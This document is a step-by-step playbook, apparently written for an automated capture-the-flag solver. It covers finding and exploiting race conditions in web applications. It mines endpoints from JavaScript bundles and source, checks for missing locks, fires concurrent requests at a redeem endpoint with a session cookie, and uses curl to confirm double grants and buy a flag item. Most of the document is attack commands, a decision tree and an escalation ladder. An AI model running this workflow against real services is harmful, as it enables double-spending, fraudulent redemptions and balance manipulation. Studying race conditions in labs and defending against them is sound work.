# Workflow deep — the exhaustive operational sequence

The full bounded engagement, expanded: every step's probe, every branch, and
the record that makes the next run cheaper.

---

## Phase 0 — Gate and match

```bash
python3 tools/classify.py "<obs>"
python3 tools/chain_match.py --source <dir> --record <name>
python3 tools/decide.py <name>
```

The chain card hands back the probe that already worked. ApexSurvive's card
says "two interleaved profile updates"; SSOS's says "hammer register for the
fixed account". Run that first.

## Phase 1 — Inventory the writable surface

The race lives only where state changes. Build the complete checked-write
list:

```bash
# endpoints from the bundle
python3 tools/web/bundle_miner.py --url "$BASE" --out /tmp/bundle
grep -rhoE '"/(api/)?[a-z0-9_/-]+"' /tmp/bundle | sort -u | grep -iE '(post|redeem|buy|vote|transfer|withdraw|verify|book|claim|register|order|reset|invite|pay|use|spin|join|bid|convert|refund|accept|submit|apply|redeem|claim)'

# routes from source
grep -rnE '(@(app|router|bp)\.(post|put|patch|delete)|path\(|Route::|urlpatterns|\.route\()' "$SRC"
```

Rank by flag-proximity: money → token → account → limit → vote → counter.

## Phase 2 — Window audit, per endpoint

For each candidate, establish the four steps:

```text
read   — the SELECT/get that loads the record
decide — the if that gates on the read
work   — email/render/fetch/second-query (the width)
write  — the UPDATE/INSERT/commit
```

The window is read→write; the work is the width.

## Phase 3 — Falsifier check, per endpoint

```bash
grep -rnE '(FOR UPDATE|select_for_update|with_for_update|SERIALIZABLE|UNIQUE|findOneAndUpdate|ConditionExpression|updateMany|update_all|update_counters|\.update\(.*where|F\(|O_EXCL|SKIP LOCKED)' "$SRC"
```

| Found | Action |
|---|---|
| atomic `UPDATE ... WHERE` + rowcount | falsifier — record, next endpoint |
| `FOR UPDATE`/`select_for_update`/`PESSIMISTIC` | falsifier |
| `UNIQUE`/`CHECK`/PK on the raced field | falsifier |
| SERIALIZABLE + retry | falsifier |
| `findOneAndUpdate`/`ConditionExpression`/`WATCH`/Lua | falsifier |
| none — but a transaction wraps the pair | still open (READ COMMITTED) — proceed |
| none — autocommit statements | open — widest |

## Phase 4 — Baseline (serial)

```bash
python3 tools/web/race_probe.py --url "$BASE/api/redeem" \
  --method POST --body '{"code":"XYZ"}' -H 'Cookie: session=...' \
  --baseline-count 5 --count 0 --no-barrier --challenge <name>
```

Record the serial signature. Any "win" shape that appears here is not a race.

## Phase 5 — Raced run

```bash
python3 tools/web/race_probe.py --url "$BASE/api/redeem" \
  --method POST --body '{"code":"XYZ"}' -H 'Cookie: session=...' \
  --concurrency 20 --count 20 --baseline-count 5 \
  --signature-mode status --write-ack --challenge <name>
```

## Phase 6 — Read the result

```text
max_in_flight = 1         → serialized — inconclusive, fix delivery
max_in_flight ≥ 2, cross  → real overlap + crossed state — confirms
real overlap, all-loser   → defence held — falsifier, record
429/403 dominant          → throttled — race the limiter or interleave
timeout on a slot         → unknown — discard, re-roll
```

## Phase 7 — Attribute and verify

The crossed state is a primitive. Read the effect, then the gate it opens:

```bash
curl -s -b "$SESSION" "$BASE/api/account" | grep balance   # -amt = crossed
curl -s -b "$SESSION" -X POST "$BASE/api/buy" -d '{"item":"flag_item"}'  # the gate
curl -s -b "$SESSION" "$BASE/api/order/1"                                  # the flag
```

## Phase 8 — Record

```bash
python3 tools/hooks.py post-probe <name> --class web-race-condition \
  --hypothesis-id <h> --verdict confirms --evidence-kind impact \
  --evidence "raced [200×2,409×18] vs baseline [200,409×4], max_in_flight=20; balance=-100" \
  --response "<tool output + state read>"
```

## Phase 9 — Escalate on exhaustion

```text
per mechanism class: 5 probes / 15 min → park, switch layer
per challenge:        25 probes / 45 min → decide.py answers escalate
rungs: chain_match → reclassify → writeup_search → novel_plan → fanout_sweep → solver_handoff
record each rung with state.py --strategy-used
```

A spent budget is a strategy change, not an end.

## Phase 10 — The kill-map write

Every falsifier and every clean real-overlap no-cross goes to
`knowledge/attempts/<name>.json` — the layer, the measurement, the reopen-if —
so the next run starts from the kill map, not zero.

## The deep decision tree

```text
writable + checked endpoint found?
├─ no  → not a race target — reclassify
└─ yes → gap in source (read≠write, work between)?
        ├─ no visible gap → check the constraint audit
        │   ├─ constraint/lock/atomic → falsifier — record
        │   └─ none → still try — the gap may be in a called function
        └─ gap visible →
            baseline serial →
            raced run →
            ├─ max_in_flight=1     → fix delivery, re-roll
            ├─ crossed state        → attribute → verify effect → record
            ├─ real overlap, clean  → falsifier — record
            └─ throttled            → race limiter / interleave
```

## The record that makes the next run cheaper

```text
endpoint:    POST /api/redeem
window:      SELECT used → grant → UPDATE used=1 (app.py:210-218)
defence:     none — no constraint, no tx, no lock
baseline:    [200,409,409,409]
raced:       max_in_flight 20 → [200×2,409×18]
crossed:     GET /api/inventory → 2 items
attribution: slots 3,11 committed within the window
verdict:     confirms
primitive:   double-grant — buy the flag_item gate next
```
